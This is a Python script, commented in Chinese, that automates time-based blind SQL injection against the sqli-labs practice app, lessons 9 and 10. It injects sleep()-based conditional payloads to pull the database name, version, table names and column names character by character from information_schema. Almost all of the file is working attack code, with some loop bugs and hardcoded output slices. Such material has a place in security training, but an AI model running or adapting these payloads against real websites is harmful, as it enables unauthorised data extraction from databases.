#!/usr/bin/evn python
#coding:utf-8

'''
**以下代码适合于第9、10课**
* python Less09.py "http://192.168.32.142/sqli/Less-9/?id=1'"
* python Less09.py 'http://192.168.32.142/sqli/Less-9/?id=1"'
'''


import requests,re,time,sys
url = sys.argv[1]
db_len =0
db_name = ''
db_version=[]
tb_count = 0
tb_list =[]
col_list= []
for i in range(1,23):
    payload = ' and  if((length(database())=%d),sleep(5),1)--+' %i
    starttime=time.time()
    r=requests.get(url+payload)
    endtime=time.time()
    b=endtime-starttime
    if b>5:
        db_len = i
for i in range(1,int(db_len)+1):
    for k in range(32,127):
        payload='  AND if(ascii(substr(version(),'+str(i)+',1))=%d,sleep(5),1)--+'  %(k)
        starttime=time.time()
        r=requests.get(url+payload)
        endtime=time.time()
        b=endtime-starttime
        if b>5:
            db_version.append(chr(k))
            break        
for i in range(1,int(db_len)+1):
    for h in range(32,127):
        payload=' AND if(ascii(substr(database(),'+str(i)+',1))='+str(h)+',sleep(5),1)--+'
        starttime=time.time()
        r=requests.get(url + payload)
        endtime=time.time()
        b=endtime-starttime
        if b>5:
            db_name +=chr(h)
            break
for i  in range(1,21):
    payload =" AND  if((%d=(select count(table_name) from \
               information_schema.tables where table_schema='%s')),sleep(5),1)--+" %(i,db_name)
    starttime=time.time()
    r=requests.get(url+payload)
    endtime=time.time()
    b=endtime-starttime
    if b>5 :
        tb_count = i
        break
print '数据库%s共有: %d张表' %(db_name,tb_count)
print ("数据库版本：" + ''.join(db_version))
print ('*')*60
for i in range(tb_count):
    tb_name =''
    for k in range(1,21):
        for l in range(95,123):
            payload = ' and if(ascii(substr((select table_name from \
                      information_schema.tables where table_schema="%s" \
                      limit %d,1),%d,1))=%d,sleep(3),1)--+' %(db_name,i,k,l)
            star=time.time()
            r=requests.get(url + payload)
            end=time.time()
            c=end-star
            if c>3:
                tb_name +=chr(l)
    tb_list.append(tb_name)
for i in tb_list:
    for v in range(100):
        payload = " and if((%d=(select count(column_name) from \
                    information_schema.columns where table_name='%s')),\
                    sleep(5),1)--+" % (v, i)
        starttime=time.time()
        r=requests.get(url+payload)
        endtime=time.time()
        a=endtime-starttime
        if a > 5 :
            for j in range(v):
               col_name=''
               for k in range(1,21):
                   payload = ' and if(ascii(substr((select column_name from \
                              information_schema.columns where table_name="%s" \
                              limit %d,1),%d,1)),sleep(5),1)--+' % (i,j,k)
                   starttime=time.time()
                   r=requests.get(url+payload)
                   endtime=time.time()
                   b=endtime-starttime
                   if b >5 :
                       k  = k
                       
                   for l in range(95,123):
                       payload = ' and if(ascii(substr((select column_name from \
                                 information_schema.columns where table_name="%s" \
                                 limit %d,1),%d,1))=%d,sleep(5),1)--+' % (i,j,k,l)
                       starttime=time.time()
                       r=requests.get(url+payload)
                       endtime=time.time()
                       c=endtime-starttime
                       if c > 5:
                           col_name += chr(l)
               col_list.append(col_name)
print ('数据库表%s: %s' %(tb_list[0],str(col_list[0:2])))
print ('数据库表%s: %s' %(tb_list[1],str(col_list[2:5])))
print ('数据表表%s: %s' %(tb_list[2],str(col_list[5:9])))
print ('数据库表%s: %s' %(tb_list[3],str(col_list[20:])))
